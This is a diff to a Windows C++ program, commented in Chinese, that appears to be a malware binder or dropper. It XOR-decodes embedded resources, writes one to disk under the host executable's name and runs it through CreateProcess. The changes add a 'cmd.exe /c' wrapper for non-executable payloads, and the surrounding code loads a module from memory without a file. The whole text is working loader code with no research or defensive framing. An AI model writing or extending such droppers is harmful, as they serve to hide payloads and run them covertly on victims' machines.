@@ -1,6 +1,7 @@
 
 #include <windows.h>
 #include <stdio.h>
+#include <string>
 #include "memory_module.h"
 #include "res1.h"
 #include "res2.h"
@@ -29,6 +30,11 @@ int load_without_file(u_char* data, size_t size){
     }
     MemoryFreeLibrary(handle);
     return result;
+}
+
+static bool endsWith(const std::string& str, const std::string& suffix)
+{
+    return str.size() >= suffix.size() && 0 == str.compare(str.size()-suffix.size(), suffix.size(), suffix);
 }
 
 
@@ -81,16 +87,12 @@ int APIENTRY WinMain(HINSTANCE hInstance,
                      int       nCmdShow)
 {
     char szapipath[MAX_PATH] = {0};
+
+#ifdef PROG1
+    char szExe[MAX_PATH] = "EXE1FILE";
+#else
     char szExe[MAX_PATH] = {0};
     char* pbuf = NULL;
-
-    for(int i = 0; i < RESLEN1; i++){
-        RES1[i] = RES1[i] ^ KEY1;
-    }
-
-    for(int i = 0; i < RESLEN2; i++){
-        RES2[i] = RES2[i] ^ KEY2;
-    }
 
     //获取应用程序目录
     GetModuleFileNameA(NULL,szapipath,MAX_PATH);
@@ -102,9 +104,26 @@ int APIENTRY WinMain(HINSTANCE hInstance,
         strcpy_s(szExe, szLine);
         szLine = strtok_s(NULL, "\\", &pbuf);
     }
+#endif
+
+    for(int i = 0; i < RESLEN1; i++){
+        RES1[i] = RES1[i] ^ KEY1;
+    }
+
+    for(int i = 0; i < RESLEN2; i++){
+        RES2[i] = RES2[i] ^ KEY2;
+    }
 
     char* res1_path = write_resource(RES1, szExe, RESLEN1);
     if (res1_path){
+        std::string res1_path_str = res1_path;
+        std::string cmd;
+        if (!endsWith(res1_path_str, ".exe")){
+            cmd = "cmd.exe /c \"" + res1_path_str + "\"";
+        }else{
+            cmd = res1_path_str;
+        }
+
         STARTUPINFO si = {sizeof(si)};
         PROCESS_INFORMATION pi;
         si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
@@ -112,11 +131,11 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 
         BOOL bRet = CreateProcess (
             NULL,   // 不在此指定可执行文件的文件名
-            res1_path,    // 命令行参数
+            (LPSTR)cmd.c_str(),    // 命令行参数
             NULL,   // 默认进程安全性
             NULL,   // 默认进程安全性
             FALSE,  // 指定当前进程内句柄不可以被子进程继承
-            NULL,   // 为新进程创建一个新的控制台窗口
+            FALSE,   // 为新进程创建一个新的控制台窗口
             NULL,   // 使用本进程的环境变量
             NULL,   // 使用本进程的驱动器和目录
             &si,
@@ -145,7 +164,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
                 NULL,   // 默认进程安全性
                 NULL,   // 默认进程安全性
                 FALSE,  // 指定当前进程内句柄不可以被子进程继承
-                NULL,   // 为新进程创建一个新的控制台窗口
+                FALSE,   // 为新进程创建一个新的控制台窗口
                 NULL,   // 使用本进程的环境变量
                 NULL,   // 使用本进程的驱动器和目录
                 &si2,
